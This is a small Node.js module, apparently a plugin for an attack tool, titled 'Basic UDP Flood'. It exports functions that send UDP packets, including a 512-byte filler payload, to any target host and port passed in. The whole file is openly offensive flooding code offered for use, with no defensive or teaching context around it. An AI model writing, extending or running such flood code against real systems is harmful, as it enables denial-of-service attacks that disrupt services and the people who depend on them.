const dgram = require('dgram');

module.exports = {
    name: 'Basic UDP Flood',
    description: 'Sends basic UDP packets to target',
    
    execute: async (target, port) => {
        const socket = dgram.createSocket('udp4');
        const message = Buffer.from('TEST');
        
        return new Promise((resolve, reject) => {
            socket.send(message, port, target, (err) => {
                if (err) reject(err);
                else resolve({ sent: true, size: message.length });
                socket.close();
            });
        });
    },
    
    flood: (target, port, callback) => {
        const socket = dgram.createSocket('udp4');
        const message = Buffer.from('X'.repeat(512));
        
        socket.send(message, port, target, (err) => {
            socket.close();
            callback(!err);
        });
    }
};